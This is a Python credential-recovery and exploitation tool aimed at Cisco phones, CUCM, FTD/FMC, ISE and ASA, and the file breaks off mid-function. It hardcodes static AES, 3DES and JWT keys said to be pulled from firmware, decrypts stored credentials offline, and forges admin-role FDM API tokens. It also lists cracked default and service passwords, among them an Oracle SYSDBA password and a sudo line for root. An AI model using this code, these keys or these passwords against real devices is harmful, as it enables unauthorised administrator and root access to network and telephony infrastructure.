"""
cisco_hash_cracker.py
Cisco credential recovery tool — built from firmware RE across ablation.

Hash types covered:
  MD5crypt ($1$)        Linux /etc/passwd, Cisco IOS Type 5, phone debug user
  SHA-512crypt ($6$)    Linux /etc/shadow — FTD admin (Vuln-5)
  SHA-256crypt ($5$)    Modern Linux passwd
  SHA-256 hex (no salt) FTD DevAuthenticationProvider hashes (F-FTD-79)
  SHA-1 hex (no salt)   CUCM CUCMInventoryConstants.class hardcoded
  SHA-1/base64          CUCM cwpass.xml: base64(SHA-1(password))
  IOS Type 7            Vigenere XOR — deterministic decode, no brute-force
  IOS Type 8            PBKDF2-SHA256 crack
  IOS Type 9            scrypt crack

Decrypt primitives (no brute-force):
  CUCM AES-128-CBC      static key smetsysocsiccni\x00 (CUCM-F3)
  CUCM DRF AES-GCM      all-zero IV nonce-reuse (CUCM-F116)
  FTD AES-256-CBC       SHA-256(static passphrase) key (Vuln-3 / F-FTD-110)
  FTD Neo4j AES-128-CTR world-readable Neo4j key — FDM admin password (Vuln-6)

Active exploitation helpers:
  forge_fdm_jwt()       Forge FDM JWT with static HMAC-SHA256 key (Vuln-2)
  crack_radius_secret() Brute-force RADIUS shared secret from packet capture (ASA-F1)

Wordlist: RE across 79xx/78xx/88xx/89xx/CUCM/FTD/FMC/ASA — all ablation modules.
Pre-verified fast-path hits avoid iteration on all known findings.

Usage (library):
  from cisco_hash_cracker import crack, type7_decode, cucm_aes_decrypt
  from cisco_hash_cracker import ftd_aes256_decrypt, ftd_neo4j_decrypt, forge_fdm_jwt
  print(crack('$1$aoJQnypw$vHpN9WTJEQn1UnHzJdoz71'))
  print(crack('3b612c75a7b5048a435fb6ec81e52ff92d6d795a8b5a9c17070f6a63c97a53b2'))
  print(type7_decode('07362E590E1B1C041B000A'))
  print(ftd_aes256_decrypt('<base64>'))
  print(ftd_neo4j_decrypt('<base64>', key_b64='nEL5/RGp/PwmtbxTJf1RxQ=='))
  print(forge_fdm_jwt(role='ROLE_ADMIN'))

Usage (CLI):
  python3 cisco_hash_cracker.py '$1$aoJQnypw$vHpN9WTJEQn1UnHzJdoz71'
  python3 cisco_hash_cracker.py '3b612c75a7b5048a435fb6ec81e52ff92d6d795a8b5a9c17070f6a63c97a53b2'
  python3 cisco_hash_cracker.py --type 7 '07362E590E1B1C041B000A'
  python3 cisco_hash_cracker.py --cucm-aes '<base64>'
  python3 cisco_hash_cracker.py --ftd-aes '<base64>'
  python3 cisco_hash_cracker.py --ftd-neo4j '<base64>' [--ftd-jwt-key <hex>]
  python3 cisco_hash_cracker.py --forge-jwt [--role ROLE_ADMIN] [--ftd-jwt-key <hex>]
  python3 cisco_hash_cracker.py --radius-secret --req-auth <hex16> --resp-auth <hex16> \
      --resp-code 2 --resp-id <int> --resp-attrs <hexbytes>
  python3 cisco_hash_cracker.py --findings
  python3 cisco_hash_cracker.py --wordlist custom.txt '$1$salt$hash'
"""

import hashlib
import hmac as _hmac
import struct
import base64
import json
import sys
import os
from typing import Optional, Iterator


# ─────────────────────────────────────────────────────────────────────────────
# Static keys and constants extracted via RE
# ─────────────────────────────────────────────────────────────────────────────

# CUCM-F3 / CUCM-F390 / CUCM-F570 — CCMEncryption static AES-128-CBC fallback key
# "incciscosystems" reversed + null pad to 16B
CUCM_STATIC_KEY = b"smetsysocsiccni\x00"  # hex: 736d65747379736f63736963636e6900

# Vuln-3 / F-FTD-110 — FTD/FMC encryption_util.py hardcoded AES-256-CBC passphrase
# /ngfw/cisco/sf_common_base/util/encryption_util.py, Copyright 2011-2013, unchanged
# Affects ALL FTD and FMC installations worldwide
FTD_AES256_PASSPHRASE = b"r4onxh8364&Jh^%P)Kqf65d6ev#^%#(&(;kuwtUTR-WQp%^#86"
FTD_AES256_KEY = hashlib.sha256(FTD_AES256_PASSPHRASE).digest()  # 32 bytes, AES-256

# Vuln-2 — FDM JWT HMAC-SHA256 static signing key
# Source: Neo4j NGFWCache["encryptionkey64"], UUID 6adc7474-37f8-482b-a9d2-8e0e34d1628a
# File: /ngfw/var/lib/db/ngfw.db/neostore.propertystore.db.strings (world-readable)
# Static across all FTD 7.0.0-94 installs; persists across Tomcat restarts
FTD_JWT_KEY_HEX = "9c42f9fd11a9fcfc26b5bc5325fd51c5"
FTD_JWT_KEY = bytes.fromhex(FTD_JWT_KEY_HEX)
FTD_JWT_KEY_B64 = "nEL5/RGp/PwmtbxTJf1RxQ=="

# CUCM-F116 — DRF AES-GCM all-zero IV + PBKDF2 sequential salt
DRF_ZERO_IV = bytes(16)
DRF_PBKDF2_SALT = bytes(range(1, 17))  # 0x01 0x02 ... 0x10

# ISE-Vuln-1 — PSP-Commons-3.5.0-527.jar DefaultCryptEncryptor static 3DES key
# com.cisco.epm.auth.encryptor.crypt.DefaultCryptEncryptor.encryptionKey
# Algorithm: DESede/ECB/PKCS5Padding; useNewKey=false = default state (pre-setup)
# Decrypts all Oracle credentials in db.properties and CreateCpmTables.sql
ISE_3DES_KEY = b"ASDF asdf 1234 8983 jkla"  # 24 bytes; K1=ASDF asd K2=f 1234 8 K3=983 jkla

# Cisco IOS Type 7 Vigenere XOR key (standard 53-byte cycle)
_TYPE7_KEY = b"dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg87"


# ─────────────────────────────────────────────────────────────────────────────
# Pre-verified known hashes — fast-path before any iteration
# All confirmed via firmware RE and lab testing across ablation modules
# ─────────────────────────────────────────────────────────────────────────────

KNOWN_HASHES = {
    # ── Phone firmware (PHN-F15) ──────────────────────────────────────────────
    "$1$aoJQnypw$vHpN9WTJEQn1UnHzJdoz71": {
        "plaintext": "debug",
        "source": "PHN-F15 — Cisco 78xx/8845-65 UC firmware; uid=debug, shell=/usr/sbin/debugsh",
        "firmware": ["78xx 12.5.1SR1-4 P1/P2", "78xx 12.8.1 r1/r2", "8845-65 12.8.1"],
        "crack_method": "Cisco RE wordlist, username=password",
    },
    # ── FTD / FDM (F-FTD-79 DevAuth hardcoded SHA-256) ───────────────────────
    # DevAuthenticationProvider: SHA-256(password), no salt; factory-fresh FTD only
    "3b612c75a7b5048a435fb6ec81e52ff92d6d795a8b5a9c17070f6a63c97a53b2": {
        "plaintext": "Admin123",
        "source": "F-FTD-79 — FDM DevAuthenticationProvider DEFAULT_ADMIN_HASHES; factory-fresh FTD (no DB password)",
        "username": "admin",
    },
    "87285c98748de9eb28e479eb93753834a4fe78969a86aa6cfcc69d322035bbf7": {
        "plaintext": "Sourcefire",
        "source": "F-FTD-79 — FDM DevAuthenticationProvider DEFAULT_ADMIN_HASHES; legacy Sourcefire password",
        "username": "admin",
    },
    "22b7dec7305d63e2c769b0c9141114e69a194cc853b444c73b7be3a0771b628a": {
        "plaintext": "Admin123$",
        "source": "F-FTD-79 — FDM DevAuthenticationProvider DEFAULT_ADMIN_HASHES",
        "username": "admin",
    },
    "67f990abc31023dd7b3b1ce5fcb42700259a1c0b58e789cb2b9b11c6d8c66ccc": {
        "plaintext": "Reader123",
        "source": "F-FTD-79 — FDM DevAuthenticationProvider DEFAULT_READER_HASHES (dev/lab builds only)",
        "username": "reader",
    },
    "38fd66646aba4dbf831717723ae1a1c865a7a71c865f90ed41ac1f8eae51ae49": {
        "plaintext": "Reader123$",
        "source": "F-FTD-79 — FDM DevAuthenticationProvider DEFAULT_READER_HASHES",
        "username": "reader",
    },
    "fb02892b1036bdb626e591b38188d7310450eea2a198f468f09336d6d1b4e664": {
        "plaintext": "Writer123",
        "source": "F-FTD-79 — FDM DevAuthenticationProvider DEFAULT_WRITER_HASHES (dev/lab builds only)",
        "username": "writer",
    },
    "42e7974de3ce2f369a50ce692f3665b4e42376b60e57416b57898dd94e322ec0": {
        "plaintext": "Writer123$",
        "source": "F-FTD-79 — FDM DevAuthenticationProvider DEFAULT_WRITER_HASHES",
        "username": "writer",
    },
    # ── FTD Linux shadow (Vuln-5) ─────────────────────────────────────────────
    # Extracted via NOPASSWD cli_shadow, cracked in <1s; SHA-512crypt
    "$6$EW6Lr2TLvDLZ/VLr$DfPAZvf4JieBs0TyE19JIBeMQJU3txXmPrvekVqq9LIu9BgCOCk8SvZ5vZzKsqLQdNNsJX9j0ptIzb7oWRQGE1": {
        "plaintext": "cisco123",
        "source": "Vuln-5 — FTD 7.0.0-94 admin Linux shadow hash; extracted via NOPASSWD cli_shadow sudoers entry",
        "crack_method": "rockyou.txt, <1 second",
        "note": "Grants root via: printf 'cisco123\\n' | sudo -S id",
    },
    # ── CUCM ─────────────────────────────────────────────────────────────────
    "79c11ee954d97f66ff425e73b6c94203bbbaddac": {
        "plaintext": "ccmadmin",
        "source": "CUCM-F403 — CUCMInventoryConstants.class bytecode; hardcoded SHA-1 hex",
        "username": "ccmadmin",
    },
    "0DPiKuNIrrVmD8IUCuw1hQxNqZc=": {
        "plaintext": "admin",
        "source": "CUCM cwpass.xml SHA-1/base64 admin credential",
    },

    # ── ISE 3DES Oracle credentials (ISE-Vuln-1) ─────────────────────────────
    # DESede/ECB/PKCS5Padding, key=ISE_3DES_KEY; use ise_3des_decrypt() directly
    # These are base64 3DES ciphertexts, NOT hashes — stored here for fast-path lookup
    "pTZv2LEjfGPX5YICzJb95g==": {
        "plaintext": "U0l1_6v#k3c",
        "source": "ISE-Vuln-1 — Oracle cepm/mnt/strmadmin/sys/system credential (db.properties); SYSDBA on SID cpm10",
        "decrypt": "ise_3des_decrypt",
    },
    "1GOnYUy8rmREq6iEZjvEnQ==": {
        "plaintext": "mohammal",
        "source": "ISE-Vuln-1 — Oracle PAP handler credential (CreateCpmTables.sql SEC_APPGRP_ENTLREPO)",
        "decrypt": "ise_3des_decrypt",
    },
    "h1BYu+lcwcM=": {
        "plaintext": "admin",
        "source": "ISE-Vuln-1 — Oracle superuser XACML entitlement repo (CreateCpmTables.sql)",
        "decrypt": "ise_3des_decrypt",
    },
    "fG5w7wguLks=": {
        "plaintext": "psctest",
        "source": "ISE-Vuln-1 — Oracle dev DB link (db.properties, commented out; dev environment residue)",
        "decrypt": "ise_3des_decrypt",
    },
}


# ─────────────────────────────────────────────────────────────────────────────
# Cisco RE-derived wordlist
# Sources: static keys, firmware RE, live deployment artifacts, disclosure PoC
# ─────────────────────────────────────────────────────────────────────────────

_CISCO_BASE_WORDS = [
    # ── Static AES/crypto key material ───────────────────────────────────────
    "smetsysocsiccni",        # CUCM-F3 AES-128 static key
    "incciscosystems",        # reversed form
    "8p3BTg2tvtG0Kg//Hqahy8x29u9FPxH2",  # CUCM-F139 OpenSSO/OpenAM key

    # ── FTD/FMC factory defaults (confirmed from disclosure PoC) ─────────────
    "Admin123",               # FDM factory admin (Vuln-1 PoC, Vuln-2 PoC, F-FTD-79)
    "Admin123$",              # FTD DevAuth variant
    "Sourcefire",             # Legacy Cisco acquisition password (F-FTD-79)

    # ── FTD/FDM developer/reader/writer accounts (F-FTD-79, lab/CI builds) ───
    "Reader123",
    "Reader123$",
    "Writer123",
    "Writer123$",
    "probe",                  # FTD dev account username=password

    # ── FTD Linux system password (Vuln-5, confirmed cracked) ────────────────
    "cisco123",

    # ── FTD internal service credentials ─────────────────────────────────────
    "mbuser",                 # F-FTD-59: sfmb SF_AUTH_NAME (/etc/sf/ims-data.conf)
    "snortrules",             # F-FTD-59: sfmb SF_AUTH_PW — mbuser:snortrules
    "barnyard",               # F-FTD-77: MySQL barnyard:barnyard (sfsnort DB, Snort alerts)
    "correlator",             # F-FTD-77: MySQL correlator:correlator (event correlation)
    "bonfire-app",            # F-FTD-82: RabbitMQ username in /bonfire vhost
    "bonfireapp",
    "bonfire",

    # ── PHN-F17 live TFTP deployment credentials ──────────────────────────────
    "foojansun",
    "8dffrffr54",
    "fd34rvf",

    # ── CUCM service accounts ─────────────────────────────────────────────────
    "ccmuser",
    "cfguser",
    "correlator",
    "barnyard",
    "jacorb",
    "customersuppadmin",
    "ccmadmin",
    "ccmservice",

    # ── Platform debug accounts ───────────────────────────────────────────────
    "debug",                  # PHN-F15: debug:debug across 78xx/8845-65 UC

    # ── Phone platform identifiers ────────────────────────────────────────────
    "handyiron",
    "secd_debug",
    "secureapp",
    "ipcphone",
    "ipphone",

    # ── Cisco product defaults (ASA, IOS, NX-OS) ─────────────────────────────
    "cisco",
    "cisco123",
    "cisco1234",
    "Cisco123",
    "Cisco1234",
    "c1sc0",
    "C1sco",
    "cisco!",
    "cisco@123",

    # ── Generic defaults ──────────────────────────────────────────────────────
    "admin",
    "password",
    "Password1",
    "passw0rd",
    "Passw0rd",
    "default",
    "guest",
    "1234",
    "12345",
    "123456",

    # ── ASA/IOS service defaults ──────────────────────────────────────────────
    "telnet",
    "enable",
    "secret",
    "class",
    "sanfran",
    "radius",
    "tacacs",

    # ── Company name variants ─────────────────────────────────────────────────
    "ciscoincorporated",
    "ciscosystems",
    "ciscoincorp",
    "ciscosystemsinc",
    "inccisco",

    # ── Platform IDs sometimes used as credentials ────────────────────────────
    "PAS30831",
    "pas30831",
    "PAS3ARM1",
    "pas3arm1",

    # ── JBoss/Tomcat defaults on CUCM ────────────────────────────────────────
    "ActiveMQ",
    "activemq",
    "jacorb123",
    "ranga",
    "rangaranga",

    # ── FMC 10.0.1-1 (from disclosure) ───────────────────────────────────────
    "dmkebdpq",           # FMC SymmetricDS Sybase vms dba password (Vuln-4)
    "lamplighter",        # FMC Lamplighter TrustStore password (Vuln-29)
    "monetdb123",         # FMC MonetDB monetdb user (dbaccess.conf.in Vuln-5)
    "eventdb123",         # FMC MonetDB eventdb_user (dbaccess.conf.in Vuln-5)
    "interface",          # FMC MySQL interface:interface (dbaccess.conf.in Vuln-5)
    "external",           # FMC MySQL external:external (dbaccess.conf.in Vuln-5)
    "cfguser",            # FMC MySQL cfguser:cfguser (dbaccess.conf.in Vuln-5)
    "ll-local-user",      # FMC RabbitMQ ll-local-user:ll-local-user (Vuln-6)

    # ── ISE 3.5.0.527 (from disclosure) ──────────────────────────────────────
    "mohammal",           # ISE Oracle PAP handler credential (ISE-Vuln-1, 3DES-decrypted)
    "psctest",            # ISE dev DB link (ISE-Vuln-1, 3DES-decrypted, commented residue)
    "Mali",               # ISE Oracle SEC_PIP_MASTER plaintext (ISE-Vuln-6)
    "U0l1_6v#k3c",        # ISE Oracle default SYSDBA password (ISE-Vuln-1, 3DES-decrypted)
    "irf",                # ISE IRF RabbitMQ administrator credential (ISE-Add-2)
    "handleruser",        # ISE Oracle PAP handler username (username=password pattern)
]


# ─────────────────────────────────────────────────────────────────────────────
# Pure-Python MD5crypt ($1$) — verified against PHN-F15 known hash
# ─────────────────────────────────────────────────────────────────────────────

_B64 = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"


def _to64(v: int, n: int) -> str:
    result = []
    for _ in range(n):
        result.append(_B64[v & 0x3f])
        v >>= 6
    return "".join(result)


def _md5crypt(password: bytes, salt: bytes) -> str:
    """Pure-Python MD5crypt ($1$). Verified against PHN-F15 hash."""
    dig_b = hashlib.md5(password + salt + password).digest()
    m = hashlib.md5()
    m.update(password + b"$1$" + salt)
    for _ in range(len(password) // 16):
        m.update(dig_b)
    m.update(dig_b[: len(password) % 16])
    i = len(password)
    while i:
        m.update(b"\x00" if (i & 1) else password[:1])
        i >>= 1
    dig_a = m.digest()
    for i in range(1000):
        m = hashlib.md5()
        m.update(password if (i & 1) else dig_a)
        if i % 3:
            m.update(salt)
        if i % 7:
            m.update(password)
        m.update(dig_a if (i & 1) else password)
        dig_a = m.digest()
    d = dig_a
    h = (
        _to64((d[0] << 16) | (d[6] << 8) | d[12], 4)
        + _to64((d[1] << 16) | (d[7] << 8) | d[13], 4)
        + _to64((d[2] << 16) | (d[8] << 8) | d[14], 4)
        + _to64((d[3] << 16) | (d[9] << 8) | d[15], 4)
        + _to64((d[4] << 16) | (d[10] << 8) | d[5], 4)
        + _to64(d[11], 2)
    )
    return f"$1${salt.decode('latin-1')}${h}"


# ─────────────────────────────────────────────────────────────────────────────
# SHA-crypt ($5$ SHA-256, $6$ SHA-512)
# ─────────────────────────────────────────────────────────────────────────────

def _sha_crypt_verify(password: bytes, hash_str: str) -> bool:
    """
    Verify a SHA-256crypt or SHA-512crypt hash using the crypt module (stdlib).
    Falls back to a pure-Python check if crypt is unavailable (Python 3.13+).
    """
    try:
        import crypt as _crypt
        # Extract salt: everything up to and including the third $ for $6$rounds=...$ or $6$salt$
        parts = hash_str.split("$")
        if len(parts) >= 4:
            if parts[2].startswith("rounds="):
                setting = "$".join(parts[:4])
            else:
                setting = "$".join(parts[:3])
            return _crypt.crypt(password.decode("utf-8", errors="replace"), setting) == hash_str
    except ImportError:
        pass
    # Pure-Python fallback: only MD5crypt is fully implemented above;
    # for SHA-512/256 fall back to passlib if available
    try:
        from passlib.hash import sha512_crypt, sha256_crypt
        if hash_str.startswith("$6$"):
            return sha512_crypt.verify(password.decode("utf-8", errors="replace"), hash_str)
        if hash_str.startswith("$5$"):
            return sha256_crypt.verify(password.decode("utf-8", errors="replace"), hash_str)
    except ImportError:
        pass
    return False


# ─────────────────────────────────────────────────────────────────────────────
# IOS Type 8 (PBKDF2-SHA256) and Type 9 (scrypt)
# ─────────────────────────────────────────────────────────────────────────────

def _type8_verify(password: bytes, hash_str: str) -> bool:
    parts = hash_str.split("$")
    if len(parts) < 4:
        return False
    salt_b64, expected = parts[2], parts[3]
    try:
        salt = base64.b64decode(salt_b64 + "==")
    except Exception:
        return False
    dk = hashlib.pbkdf2_hmac("sha256", password, salt, 20000, dklen=32)
    result = []
    for i in range(0, len(dk), 3):
        chunk = dk[i:i+3]
        v = (chunk[0] << 16) | (chunk[1] << 8 if len(chunk) > 1 else 0) | (chunk[2] if len(chunk) > 2 else 0)
        result.append(_to64(v, 4 if len(chunk) == 3 else (3 if len(chunk) == 2 else 2)))
    return "".join(result) == expected


def _type9_verify(password: bytes, hash_str: str) -> bool:
    parts = hash_str.split("$")
    if len(parts) < 4:
        return False
    salt_b64, expected = parts[2], parts[3]
    try:
        salt = base64.b64decode(salt_b64 + "==")
    except Exception:
        return False
    dk = hashlib.scrypt(password, salt=salt, n=16384, r=1, p=1, dklen=32)
    result = []
    for i in range(0, len(dk), 3):
        chunk = dk[i:i+3]
        v = (chunk[0] << 16) | (chunk[1] << 8 if len(chunk) > 1 else 0) | (chunk[2] if len(chunk) > 2 else 0)
        result.append(_to64(v, 4 if len(chunk) == 3 else (3 if len(chunk) == 2 else 2)))
    return "".join(result) == expected


# ─────────────────────────────────────────────────────────────────────────────
# Hash type detection
# ─────────────────────────────────────────────────────────────────────────────

def detect_hash_type(target: str) -> str:
    t = target.strip()
    if t.startswith("$1$"):
        return "md5crypt"
    if t.startswith("$5$"):
        return "sha256crypt"
    if t.startswith("$6$"):
        return "sha512crypt"
    if t.startswith("$8$"):
        return "ios_type8"
    if t.startswith("$9$"):
        return "ios_type9"
    if len(t) == 64 and all(c in "0123456789abcdefABCDEF" for c in t):
        return "sha256_hex"
    if len(t) == 40 and all(c in "0123456789abcdefABCDEF" for c in t):
        return "sha1_hex"
    if len(t) in (27, 28):
        try:
            decoded = base64.b64decode(t + "==")
            if len(decoded) == 20:
                return "sha1_b64"
        except Exception:
            pass
    if len(t) == 44:
        try:
            decoded = base64.b64decode(t)
            if len(decoded) == 32:
                return "sha256_b64"
        except Exception:
            pass
    if len(t) >= 4 and t[:2].isdigit() and all(c in "0123456789abcdefABCDEF" for c in t[2:]):
        return "ios_type7"
    return "unknown"


# ─────────────────────────────────────────────────────────────────────────────
# IOS Type 7 — deterministic decode (NOT a crack, pure reversal)
# ─────────────────────────────────────────────────────────────────────────────

def type7_decode(encrypted: str) -> Optional[str]:
    """
    Decode Cisco IOS Type 7 password. Deterministic — no brute-force.
    Input: 'XX<hexstring>' where XX (00-15) is the seed offset.
    """
    encrypted = encrypted.strip()
    try:
        seed = int(encrypted[:2])
        pairs = [encrypted[i:i+2] for i in range(2, len(encrypted), 2)]
        result = []
        for i, pair in enumerate(pairs):
            byte = int(pair, 16) ^ _TYPE7_KEY[(seed + i) % len(_TYPE7_KEY)]
            result.append(chr(byte))
        plaintext = "".join(result)
        if "\x00" in plaintext:
            plaintext = plaintext[:plaintext.index("\x00")]
        return plaintext
    except (ValueError, IndexError):
        return None


def type7_encode(plaintext: str, seed: int = 0) -> str:
    """Encode to Cisco IOS Type 7. Useful for test vector generation."""
    result = [f"{seed:02d}"]
    for i, ch in enumerate(plaintext):
        enc = ord(ch) ^ _TYPE7_KEY[(seed + i) % len(_TYPE7_KEY)]
        result.append(f"{enc:02X}")
    return "".join(result)


# ─────────────────────────────────────────────────────────────────────────────
# CUCM AES-128-CBC decrypt (CUCM-F3)
# Wire: base64(IV[16] || AES-128-CBC-PKCS5(ciphertext))
# ─────────────────────────────────────────────────────────────────────────────

def cucm_aes_decrypt(ciphertext_b64: str, key: bytes = CUCM_STATIC_KEY) -> Optional[str]:
    """Decrypt CUCM credential with static AES-128-CBC key (smetsysocsiccni\\x00)."""
    try:
        raw = base64.b64decode(ciphertext_b64)
    except Exception:
        try:
            raw = bytes.fromhex(ciphertext_b64)
        except Exception:
            return None
    if len(raw) < 32 or len(raw) % 16 != 0:
        return None
    iv, ciphertext = raw[:16], raw[16:]
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import unpad
        return unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ciphertext), 16).decode("utf-8", errors="replace")
    except ImportError:
        pass
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import padding
        dec = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()).decryptor()
        raw_plain = dec.update(ciphertext) + dec.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        return (unpadder.update(raw_plain) + unpadder.finalize()).decode("utf-8", errors="replace")
    except ImportError:
        pass
    return None


# ─────────────────────────────────────────────────────────────────────────────
# FTD AES-256-CBC decrypt (Vuln-3 / F-FTD-110)
# Key = SHA-256(FTD_AES256_PASSPHRASE); wire: IV(16)||AES-256-CBC-PKCS5(ct)
# Identical on ALL FTD and FMC installations (passphrase unchanged since 2011)
# ─────────────────────────────────────────────────────────────────────────────

def ftd_aes256_decrypt(ciphertext_b64: str, key: bytes = FTD_AES256_KEY) -> Optional[str]:
    """
    Decrypt FTD management-plane ciphertext with static AES-256-CBC key (Vuln-3).
    Offline capability — no running system required.
    """
    try:
        raw = base64.b64decode(ciphertext_b64)
    except Exception:
        try:
            raw = bytes.fromhex(ciphertext_b64)
        except Exception:
            return None
    if len(raw) < 32 or len(raw) % 16 != 0:
        return None
    iv, ciphertext = raw[:16], raw[16:]
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import unpad
        return unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ciphertext), 16).decode("utf-8", errors="replace")
    except ImportError:
        pass
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import padding
        dec = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()).decryptor()
        raw_plain = dec.update(ciphertext) + dec.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        return (unpadder.update(raw_plain) + unpadder.finalize()).decode("utf-8", errors="replace")
    except ImportError:
        pass
    return None


# ─────────────────────────────────────────────────────────────────────────────
# FTD Neo4j AES-128-CTR decrypt (Vuln-6)
# Key: extracted from neostore.propertystore.db.strings (world-readable)
# Wire: base64(IV[16] || AES-128-CTR(ciphertext))
# Counter: Counter.new(128, initial_value=int.from_bytes(iv, 'big'))
# ─────────────────────────────────────────────────────────────────────────────

def ftd_neo4j_decrypt(ciphertext_b64: str,
                       key_b64: str = FTD_JWT_KEY_B64) -> Optional[str]:
    """
    Decrypt FDM admin application password using Neo4j AES-128-CTR key (Vuln-6).
    Key is the same as the JWT signing key (nEL5/RGp/PwmtbxTJf1RxQ==).

    Args:
        ciphertext_b64: base64-encoded encrypted password from Neo4j admin user node
        key_b64:        base64-encoded 16-byte AES-128 key (from SerializationKey node)
    """
    try:
        raw = base64.b64decode(ciphertext_b64)
        key = base64.b64decode(key_b64)
    except Exception:
        return None
    if len(raw) < 32:
        return None
    iv, ciphertext = raw[:16], raw[16:]
    try:
        from Crypto.Cipher import AES
        from Crypto.Util import Counter
        ctr = Counter.new(128, initial_value=int.from_bytes(iv, "big"))
        return AES.new(key, AES.MODE_CTR, counter=ctr).decrypt(ciphertext).decode("utf-8", errors="replace")
    except ImportError:
        pass
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        # CTR nonce: first 8 bytes of IV as nonce, next 8 as initial counter
        nonce = iv[:8]
        initial_value = int.from_bytes(iv[8:], "big")
        cipher = Cipher(
            algorithms.AES(key),
            modes.CTR(iv),
            backend=default_backend()
        )
        dec = cipher.decryptor()
        return (dec.update(ciphertext) + dec.finalize()).decode("utf-8", errors="replace")
    except Exception:
        pass
    return None


# ─────────────────────────────────────────────────────────────────────────────
# FTD JWT forge (Vuln-2)
# Signs with static HMAC-SHA256 key from Neo4j — grants full FDM API access
# ─────────────────────────────────────────────────────────────────────────────

def forge_fdm_jwt(role: str = "ROLE_ADMIN",
                   original_token: Optional[str] = None,
                   key: bytes = FTD_JWT_KEY) -> str:
    """
    Forge a Cisco FDM JWT token using the static HMAC-SHA256 signing key (Vuln-2).
    Confirmed: server trusts userRole from token payload, not server-side session.

    Args:
        role:           JWT userRole claim: 'ROLE_ADMIN' (full API) or 'ROLE_USER'
        original_token: If provided, modify this token's claims (preserves valid JTI)
        key:            Signing key bytes (defaults to extracted 9c42f9fd... key)

    Returns:
        Forged JWT string — use as: Authorization: Bearer <token>
    """
    import time

    def b64url(data) -> str:
        if isinstance(data, dict):
            data = json.dumps(data, separators=(",", ":")).encode()
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    header = {"alg": "HS256"}

    if original_token:
        parts = original_token.split(".")
        claims = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
    else:
        now = int(time.time())
        claims = {
            "jti": "e3e74c32-0000-0000-0000-000000000001",
            "iss": "Cisco-FDM",
            "iat": now,
            "exp": now + 3600,
            "type": "ACCESS",
        }

    claims["userRole"] = role

    hdr_enc = b64url(header)
    pay_enc = b64url(claims)
    sig_input = f"{hdr_enc}.{pay_enc}".encode()
    sig = _hmac.new(key, sig_input, hashlib.sha256).digest()
    return f"{hdr_enc}.{pay_enc}.{b64url(sig)}"


# ─────────────────────────────────────────────────────────────────────────────
# CUCM DRF AES-GCM decrypt (CUCM-F116)
# All-zero IV enables offline decryption with known passphrase (CUCM-F120)
# ─────────────────────────────────────────────────────────────────────────────

def drf_aes_gcm_decrypt(ciphertext_b64: str, passphrase: str) -> Optional[str]:
    """
    Decrypt CUCM DRF backup credential via AES-GCM all-zero IV (CUCM-F116).
    Passphrase from platformConfig.xml (CUCM-F120).
    """
    try:
        raw = base64.b64decode(ciphertext_b64)
    except Exception:
        return None
    key = hashlib.pbkdf2_hmac("sha256", passphrase.encode("utf-8"), DRF_PBKDF2_SALT, 65536, dklen=32)
    try:
        from Crypto.Cipher import AES
        ct, tag = raw[:-16], raw[-16:]
        plain = AES.new(key, AES.MODE_GCM, nonce=DRF_ZERO_IV).decrypt_and_verify(ct, tag)
        return plain.decode("utf-8", errors="replace")
    except Exception:
        return None


# ─────────────────────────────────────────────────────────────────────────────
# ISE 3DES-ECB decrypt (ISE-Vuln-1)
# Key: DefaultCryptEncryptor.encryptionKey — static across ALL pre-setup ISE installs
# Decrypts db.properties and CreateCpmTables.sql Oracle credentials offline
# ─────────────────────────────────────────────────────────────────────────────

def ise_3des_decrypt(ciphertext_b64: str, key: bytes = ISE_3DES_KEY) -> Optional[str]:
    """
    Decrypt ISE DefaultCryptEncryptor ciphertext (ISE-Vuln-1).
    Algorithm: DESede/ECB/PKCS5Padding; static key b'ASDF asdf 1234 8983 jkla'.
    Input: base64-encoded ciphertext from db.properties or CreateCpmTables.sql.

    Pre-verified outputs (CVSS 9.1 Critical):
      pTZv2LEjfGPX5YICzJb95g==  ->  U0l1_6v#k3c  (Oracle SYSDBA on SID cpm10)
      1GOnYUy8rmREq6iEZjvEnQ==  ->  mohammal     (PAP handler)
      h1BYu+lcwcM=              ->  admin        (XACML superuser)
      fG5w7wguLks=              ->  psctest      (dev DB link)
    """
    # Fast-path: pre-verified ciphertexts
    if ciphertext_b64 in KNOWN_HASHES:
        info = KNOWN_HASHES[ciphertext_b64]
        if info.get("decrypt") == "ise_3des_decrypt":
            return info["plaintext"]
    try:
        raw = base64.b64decode(ciphertext_b64)
    except Exception:
        return None
    try:
        from Crypto.Cipher import DES3
        from Crypto.Util.Padding import unpad
        cipher = DES3.new(key, DES3.MODE_ECB)
        return unpad(cipher.decrypt(raw), 8).decode("utf-8", errors="replace")
    except ImportError:
        pass
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import padding
        # 3DES-ECB = DES with 24-byte key
        cipher = Cipher(algorithms.TripleDES(key), modes.ECB(), backend=default_backend())
        dec = cipher.decryptor()
        raw_plain = dec.update(raw) + dec.finalize()
        unpadder = padding.PKCS7(64).unpadder()
        return (unpadder.update(raw_plain) + unpadder.finalize()).decode("utf-8", errors="replace")
    except Exception:
        pass
    return None


# ─────────────────────────────────────────────────────────────────────────────
# ASA RADIUS shared secret brute-force (ASA-F1)
# Response-Authenticator = MD5(Code||ID||Length||ReqAuth||Attrs||Secret)
# Requires a captured Access-Request/Access-Accept pair
# ─────────────────────────────────────────────────────────────────────────────

def crack_radius_secret(
    req_auth: bytes,
    resp_code: int,
